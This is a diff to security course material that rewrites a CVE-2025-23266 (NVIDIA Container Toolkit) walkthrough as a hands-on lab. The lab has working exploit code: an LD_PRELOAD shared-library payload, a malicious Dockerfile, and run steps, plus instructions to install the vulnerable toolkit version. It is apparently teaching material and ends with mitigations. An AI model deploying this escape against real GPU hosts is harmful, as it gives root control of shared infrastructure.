@@ -2,7 +2,7 @@
 """
 # W1D6 - Securing AI Infrastructure: From Documents to Exploits
 
-This final day combines policy analysis, vulnerability research, and hands-on attack chain exploration to understand AI infrastructure security across multiple dimensions. You'll analyze three foundational security documents, walk through a real container escape vulnerability discovered by Wiz, and implement the complete GPUBreach attack chain.
+This final day combines policy analysis, vulnerability research, and hands-on attack chain exploration to understand AI infrastructure security across multiple dimensions. You'll analyze three foundational security documents, exploit a real container escape vulnerability discovered by Wiz, and implement the complete GPUBreach attack chain.
 
 <!-- toc -->
 
@@ -16,13 +16,13 @@ Deep analysis of three foundational reports covering threat frameworks, data cen
 > - Analyze critical attack vectors in AI data center environments
 > - Assess implementation feasibility of next-generation security controls
 
-### 2️⃣ CVE-2025-23266 Walkthrough (45 minutes)
-Guided analysis of the NVIDIA Container Toolkit vulnerability discovered by Wiz Research, understanding the attack mechanics without hands-on exploitation.
+### 2️⃣ CVE-2025-23266 Hands-On Lab (45 minutes)
+Replicate the NVIDIA Container Toolkit container escape (NVIDIAScape) discovered by Wiz Research — build a malicious image, preload a payload into the privileged `nvidia-ctk` hook, and write a file on the host as root.
 
 > **Learning Objectives**
-> - Understand LD_PRELOAD based container escape techniques
-> - Analyze how NVIDIA Container Toolkit exposes host privileges to containers
-> - Evaluate the security implications of GPU container runtime architectures
+> - Build an `LD_PRELOAD` shared-library payload and malicious Docker image
+> - Trigger the vulnerable `createContainer` hook with `--runtime=nvidia --gpus=all`
+> - Observe host-side code execution outside container isolation
 
 ### 3️⃣ GPUBreach Attack Chain (3+ hours)
 Complete implementation of a GPU-based privilege escalation chain combining RowHammer, aperture bit flipping, IOMMU bypass, and kernel exploitation.
@@ -384,221 +384,186 @@ This discussion session guides you through three foundational reports on AI infr
 
 ---
 
-## 2️⃣ CVE-2025-23266 Walkthrough: NVIDIA Container Toolkit Escape (45 minutes)
+## 2️⃣ CVE-2025-23266 Hands-On Lab: NVIDIA Container Toolkit Escape (45 minutes)
 
-This section provides a guided analysis of CVE-2025-23266, the NVIDIA Container Toolkit vulnerability discovered by Wiz Research in early 2025. We'll examine the attack mechanics through Q&A rather than hands-on exploitation.
+This is a hacking exercise. You will replicate [NVIDIAScape](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape) — CVE-2025-23266 in NVIDIA Container Toolkit ≤ 1.17.7 — and escape from a GPU container to execute arbitrary code on the host as root.
 
-### Background: Understanding the Vulnerability
+### What you are exploiting
 
-**CVE-2025-23266** is a container escape vulnerability affecting NVIDIA Container Toolkit versions through 1.17.7. The vulnerability allows malicious container images to execute arbitrary code on the host system with root privileges through an LD_PRELOAD attack vector.
+When a container starts with `--runtime=nvidia --gpus=all`, the NVIDIA Container Toolkit registers an OCI **`createContainer` hook** that runs `nvidia-ctk hook enable-cuda-compat` as a **privileged host process**.
 
-**Key Resources:**
-- **Wiz Research Blog**: https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape
-- **NVIDIA Security Bulletin**: NVIDIA Container Toolkit Advisory
-- **CVE Details**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-23266
+The bug: that hook **inherits environment variables from the container image**, including `LD_PRELOAD`. An attacker can preload a malicious `.so` into the hook process and run arbitrary code on the host.
 
-### Exercise 2.1: Attack Vector Analysis
-
-> **Difficulty**: 🔴🔴⚪⚪⚪
-> **Importance**: 🔵🔵🔵🔵🔵
-
-**Question 1**: How does the NVIDIA Container Toolkit create a trusted execution environment for GPU-enabled containers?
-
-<details>
-<summary>Answer</summary>
-
-The NVIDIA Container Toolkit (`nvidia-ctk`) acts as a bridge between Docker containers and NVIDIA GPU drivers on the host. When a container requests GPU access with `--gpus=all` or `--runtime=nvidia`, the toolkit:
-
-1. **Device Discovery**: Scans the host for available NVIDIA GPUs and driver libraries
-2. **Mount Preparation**: Identifies which host GPU devices, libraries, and binaries need to be mounted into the container
-3. **Runtime Configuration**: Modifies the container's runtime environment to include GPU access paths
-4. **Privilege Escalation**: Executes with elevated privileges to access hardware and modify container namespaces
-
-The critical security assumption is that **only trusted container images** will be executed with GPU access, as the toolkit must run privileged operations on the host during container setup.
-
-</details>
-
-**Question 2**: What is the LD_PRELOAD mechanism and why is it particularly dangerous in containerized environments?
-
-<details>
-<summary>Answer</summary>
-
-**LD_PRELOAD** is a Linux environment variable that forces the dynamic linker to load specified shared libraries before any others, effectively allowing library function interception and replacement.
-
-**In containerized environments, LD_PRELOAD becomes dangerous because:**
-
-1. **Cross-boundary execution**: When host binaries execute with LD_PRELOAD set from a container context, the preloaded library can execute arbitrary code
-2. **Privilege inheritance**: Host processes that run with elevated privileges will execute the preloaded code with those same privileges
-3. **Steganographic hiding**: Malicious libraries can be embedded within seemingly legitimate container images
-4. **Persistent infection**: LD_PRELOAD can affect multiple host process executions, not just the initial container runtime
-
-**CVE-2025-23266 Specific**: The NVIDIA Container Toolkit executes host binaries (like `nvidia-ctk`) with LD_PRELOAD environment variables inherited from the container, allowing malicious shared libraries to execute on the host with root privileges.
-
-</details>
-
-**Question 3**: Walk through the complete attack chain for CVE-2025-23266. What are the key steps an attacker must perform?
-
-<details>
-<summary>Attack Chain Breakdown</summary>
-
-**Step 1: Malicious Container Preparation**
-```dockerfile
-FROM ubuntu:22.04
-ENV LD_PRELOAD=/proc/self/cwd/malicious.so
-ADD malicious.so /
-# Container appears legitimate but includes malicious shared library
+```
+docker run --runtime=nvidia --gpus=all <malicious-image>
+  → NVIDIA runtime registers createContainer hook
+  → hook inherits LD_PRELOAD from container ENV
+  → hook cwd is container root filesystem
+  → /proc/self/cwd/poc.so resolves to attacker's library in the image
+  → poc.so constructor runs on the HOST with hook privileges
+  → write /tmp/output-<yourname> (or any host path)
 ```
 
-**Step 2: Shared Library Weaponization**
+**Key resources:**
+- [Wiz: NVIDIAScape / CVE-2025-23266](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape)
+- [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-23266)
+
+### Prerequisites
+
+| Requirement | Notes |
+|---|---|
+| Linux host with NVIDIA GPU + driver | `nvidia-smi` should work |
+| Docker with NVIDIA runtime | `docker run --runtime=nvidia --gpus=all ...` |
+| **Vulnerable** nvidia-container-toolkit | **≤ 1.17.7**, with `cuda-compat-mode=hook` |
+| Regular user (non-root) | Exploit must work without sudo |
+| `gcc`, `make`, `docker` | For building `poc.so` and the image |
+
+<!-- FIXME: is there a course lab machine for this? -->
+On the **course lab machine**, a vulnerable stack is pre-installed — do **not** install or upgrade NVIDIA packages.
+
+### Setup
+
+```bash
+cd day6-infrastructure/module1
+cp -r test day6-nvidia-<yourname>    # e.g. day6-nvidia-guava
+cd day6-nvidia-<yourname>
+```
+
+You should have:
+
+```
+day6-nvidia-<yourname>/
+├── poc.c        # your payload (edit this)
+├── Dockerfile   # malicious image (edit this)
+└── Makefile     # builds poc.so and Docker image
+```
+
+Ignore `module1/solution` unless you are stuck.
+
+### Step 1: Write `poc.c`
+
+Use a **constructor** in a shared library — it runs automatically when the library is loaded via `LD_PRELOAD`.
+
 ```c
-// malicious.c - compiled to malicious.so
-void __attribute__((constructor)) init() {
-    // Code here executes when library loads
-    // Can perform privilege escalation, data exfiltration, etc.
-    system("echo 'compromised' > /tmp/evidence");
+#include <fcntl.h>
+#include <pwd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+void __attribute__((constructor)) init(void) {
+    struct passwd *pw = getpwuid(getuid());
+    const char *username = pw ? pw->pw_name : "unknown";
+
+    char message[512] = "look it's me, user ";
+    strcat(message, username);
+    strcat(message, "\n");
+
+    // Use a UNIQUE filename for your pair/team
+    int fd = open("/tmp/output-<yourname>", O_WRONLY | O_CREAT | O_APPEND, 0644);
+    if (fd != -1) {
+        write(fd, message, strlen(message));
+        close(fd);
+    }
 }
 ```
 
-**Step 3: Container Execution with GPU Access**
-```bash
-docker run --rm --runtime=nvidia --gpus=all malicious-image
+Replace `<yourname>` with something unique (e.g. `output-guava`, `output-pranav`).
+
+### Step 2: Write `Dockerfile`
+
+```dockerfile
+FROM ubuntu:22.04
+
+ENV LD_PRELOAD=/proc/self/cwd/poc.so
+ADD poc.so /
 ```
 
-**Step 4: Toolkit Execution with Inherited Environment**
-- Docker daemon calls `nvidia-ctk` on host to configure GPU access
-- `nvidia-ctk` inherits `LD_PRELOAD=/proc/self/cwd/malicious.so` from container environment
-- Host resolves `/proc/self/cwd/` to the container's working directory
-- `nvidia-ctk` loads `malicious.so` and executes constructor function **with root privileges on the host**
+- `ENV LD_PRELOAD=...` — poison the hook's environment
+- `/proc/self/cwd/poc.so` — resolves relative to the hook's working directory (container root)
+- `ADD poc.so /` — place the payload at `/poc.so` in the image
 
-**Step 5: Host Compromise**
-- Malicious code now executes outside container boundaries
-- Can install backdoors, access host filesystem, escalate privileges permanently
-- Attack succeeded: container escaped to host root
+### Step 3: Build
 
-</details>
+```bash
+make clean
+make
+```
 
-### Exercise 2.2: Defense Analysis and Mitigation
+This runs:
 
-> **Difficulty**: 🔴🔴🔴⚪⚪
-> **Importance**: 🔵🔵🔵🔵⚪
+1. `gcc -fPIC -shared -O2 -Wall poc.c -o poc.so`
+2. `docker build -t nvidia-ctk-image .`
 
-**Question 4**: Why didn't traditional container security measures (namespaces, cgroups, seccomp) prevent this attack?
+Verify `poc.so` exists and the image built:
 
-<details>
-<summary>Answer</summary>
+```bash
+ls -l poc.so
+docker images nvidia-ctk-image
+```
 
-**Traditional container security operates at different layers:**
+### Step 4: Sanity check (optional, no Docker)
 
-1. **Namespaces**: Isolate process, network, filesystem views within the container but don't control host process execution
-2. **Cgroups**: Limit resource usage (CPU, memory) but don't restrict environment variable inheritance
-3. **Seccomp**: Filters system calls within the container but `nvidia-ctk` execution happens on the host
+Simulate loading your library into `nvidia-ctk` directly:
 
-**CVE-2025-23266 bypasses these because:**
+```bash
+rm -f /tmp/output-<yourname>
+LD_PRELOAD=./poc.so nvidia-ctk --version
+cat /tmp/output-<yourname>
+```
 
-- The vulnerable code path occurs in **host processes** (`nvidia-ctk`), not container processes
-- Environment variable inheritance is a **legitimate Docker feature** required for GPU toolkit functionality
-- The attack doesn't require container breakout through syscalls or namespace violations
-- Host privilege escalation happens through **legitimate shared library loading**, not exploiting kernel vulnerabilities
+Expected:
 
-**Key insight**: Container runtimes that execute host utilities with elevated privileges create new attack surfaces beyond traditional container isolation.
+```
+look it's me, user <your-username>
+```
 
-</details>
+This confirms the payload works. It does **not** prove the full container escape — only that `LD_PRELOAD` + your `.so` executes host-side code when `nvidia-ctk` starts.
 
-**Question 5**: What specific mitigations did NVIDIA implement in the patched version, and what are the broader lessons for container runtime security?
+### Step 5: Run the exploit
 
-<details>
-<summary>Mitigation Analysis</summary>
+```bash
+rm -f /tmp/output-<yourname>
 
-**NVIDIA's Specific Fixes (v1.17.8+):**
+docker run --rm --runtime=nvidia --gpus=all nvidia-ctk-image echo hello
 
-1. **Environment Sanitization**: `nvidia-ctk` now filters dangerous environment variables including `LD_PRELOAD` before execution
-2. **Path Validation**: Stronger validation of library paths to prevent `/proc/self/cwd/` resolution tricks
-3. **Execution Context Isolation**: Separate the runtime environment of host toolkit execution from container environment inheritance
+ls -l /tmp/output-<yourname>
+cat /tmp/output-<yourname>
+```
 
-**Broader Container Runtime Lessons:**
+**Success:** `/tmp/output-<yourname>` exists **on the host** after the container exits, even though you ran Docker as a regular user. The container only printed `hello`; the escape happened in the privileged hook before the container process started.
 
-1. **Minimize Host Execution**: Container runtimes should minimize the need for privileged host process execution
-2. **Environment Isolation**: Host utilities should never inherit untrusted environment variables from containers
-3. **Principle of Least Privilege**: GPU access shouldn't require full root privileges for toolkit execution
-4. **Secure Defaults**: Container runtimes should whitelist safe environment variables rather than blacklisting dangerous ones
+Clean up:
 
-**Architectural Recommendations:**
+```bash
+sudo rm /tmp/output-<yourname>
+```
 
-- **Hardware-isolated GPU sharing**: Technologies like SR-IOV and MIG reduce the need for privileged host toolkit execution
-- **Sandboxed runtimes**: gVisor, Kata Containers provide stronger isolation between container and host execution contexts
-- **Device plugins**: Kubernetes device plugins can manage GPU resources without runtime privilege escalation
+### Host setup (for self-testing)
 
-</details>
+If you are not on the lab VM, install a vulnerable toolkit and enable hook mode. See `module1/setup.txt` for commands. Summary:
 
-**Question 6**: How would an attacker discover and exploit this vulnerability in a real-world scenario?
+1. Install nvidia-container-toolkit **1.17.7** (do not use 1.17.8+ for the lab)
+2. `sudo nvidia-ctk runtime configure --runtime=docker`
+3. `sudo nvidia-ctk config --in-place --set nvidia-container-runtime.modes.legacy.cuda-compat-mode=hook`
+4. `sudo systemctl restart docker`
 
-<details>
-<summary>Real-World Attack Scenario</summary>
+Default on patched installs is `cuda-compat-mode = "ldconfig"`, which does not use the vulnerable code path.
 
-**Discovery Phase:**
-1. **Version enumeration**: Attacker determines NVIDIA Container Toolkit version through Docker API queries or container runtime errors
-2. **Environment testing**: Deploy test containers to understand environment variable inheritance behavior
-3. **Privilege mapping**: Identify which host processes execute during GPU container initialization
+### Troubleshooting
 
-**Exploitation Development:**
-1. **Payload crafting**: Develop shared library with persistence, data exfiltration, or lateral movement capabilities
-2. **Container disguise**: Create legitimate-looking container image (ML training, gaming, crypto mining) that includes malicious library
-3. **Social engineering**: Convince targets to run the container for "GPU performance testing" or "algorithm optimization"
+| Symptom | Likely cause | Fix |
+|---|---|---|
+| Container runs but no `/tmp/output-*` on host | Patched toolkit (≥ 1.17.8) | Use lab VM or downgrade to 1.17.7 |
+| Same as above | `cuda-compat-mode = "ldconfig"` | Set to `hook` and restart Docker |
+| `docker: could not select device driver` | NVIDIA runtime not configured | `sudo nvidia-ctk runtime configure --runtime=docker` |
+| `LD_PRELOAD` test works, Docker does not | Hook not inheriting env (patched) | Vulnerable version + hook mode required |
 
-**Attack Execution:**
-1. **Registry poisoning**: Upload malicious container to public or private registries with enticing descriptions
-2. **Supply chain insertion**: Compromise legitimate container build processes to inject malicious libraries
-3. **Insider deployment**: Use legitimate access to deploy malicious containers in enterprise environments
+### Security takeaway
 
-**Post-Exploitation:**
-1. **Persistence establishment**: Install backdoors, create new user accounts, modify system configurations
-2. **Lateral movement**: Discover other systems with GPU infrastructure, expand container deployment
-3. **Data exfiltration**: Access model weights, training data, or other sensitive AI assets stored on compromised hosts
-
-**Real Impact**: This vulnerability was particularly dangerous because GPU-enabled containers are commonly deployed for ML training and inference in high-value environments with sensitive AI models.
-
-</details>
-
-### Exercise 2.3: Broader Implications for AI Infrastructure Security
-
-> **Difficulty**: 🔴🔴🔴🔴⚪
-> **Importance**: 🔵🔵🔵🔵🔵
-
-**Discussion Questions:**
-
-1. **Trust Boundaries**: How does CVE-2025-23266 challenge assumptions about trust boundaries in GPU-enabled containerized AI workloads?
-
-2. **Supply Chain Risk**: What are the implications for AI model development when container images can compromise training infrastructure?
-
-3. **Detection Challenges**: Why would traditional security monitoring struggle to detect this type of container escape?
-
-4. **Policy Impact**: How should this vulnerability influence organizational policies around third-party container usage in AI development environments?
-
-<details>
-<summary>Discussion Framework</summary>
-
-**Trust Boundary Analysis:**
-- Traditional assumption: Container isolation provides sufficient security for multi-tenant GPU sharing
-- Reality: GPU runtime requirements create privileged host execution paths that bypass container isolation
-- Implication: GPU-enabled containers should be treated as trusted workloads requiring stronger vetting
-
-**Supply Chain Considerations:**
-- Container registries become critical security infrastructure for AI development
-- Need for signature verification, image scanning, and provenance tracking for GPU-enabled containers
-- Risk of compromised training environments leading to model backdooring or data poisoning
-
-**Detection Challenges:**
-- Host process execution appears legitimate (nvidia-ctk running normally)
-- No unusual container behavior or resource consumption
-- Requires monitoring of shared library loading and environment variable inheritance
-
-**Organizational Policy Recommendations:**
-- Restrict GPU container execution to signed, audited images only
-- Implement least-privilege GPU access (MIG, device plugins) to reduce host toolkit execution
-- Monitor and log all GPU container deployments with enhanced scrutiny
-- Regular security updates for container runtime components, not just application containers
-
-</details>
+- Containers are not a strong isolation boundary for GPU workloads.
+- A misconfigured **trusted host component** (OCI hook) + classic `LD_PRELOAD` = full host compromise.
+- Mitigation: upgrade to toolkit ≥ 1.17.8, or disable the cuda-compat hook via `disable-cuda-compat-lib-hook = true`.
 
 ---
 
@@ -1834,7 +1799,7 @@ This comprehensive day covered three critical dimensions of AI infrastructure se
 - **RAND framework**: OC1-OC5 threat actors and SL1-SL5 progressive controls give a structured way to match defenses to adversary capability. Model weights are uniquely sensitive — unlike traditional IP, they are immediately executable and high-value at terabyte scale.
 - **IAPS policy lens**: Three critical attack vectors (side-channel, supply chain, weight exfiltration) and a four-point policy framework (standards, R&D, intelligence sharing, supply chain decoupling) coordinate government-industry response. Current data center practices are insufficient for AI-specific threats.
 - **SL5 novel controls**: Five security domains (supply chain, network, machine, physical, personnel) require coordinated novel approaches. Reaching SL5 demands a *radical reduction* in trusted hardware/software components, and the document's 3-6 month feasibility assessment is the practical entry point for planning.
-- **Vulnerability Research**: CVE-2025-23266 shows how LD_PRELOAD container escapes break trust-boundary assumptions in GPU container runtimes — namespaces/cgroups/seccomp don't protect host-side toolkit execution.
+- **Vulnerability Research**: CVE-2025-23266 hands-on lab shows how `LD_PRELOAD` container escapes break trust-boundary assumptions in GPU container runtimes — namespaces/cgroups/seccomp don't protect host-side toolkit execution.
 - **Attack Chain Implementation**: GPUBreach chains RowHammer → aperture bit flip → IOMMU bypass → kernel cred overwrite. Single bit flips in PTEs change memory-access semantics, and the IOMMU's page granularity leaves sub-page OOB writes unblocked.
 
 ### Implementation Priorities for Your Organization
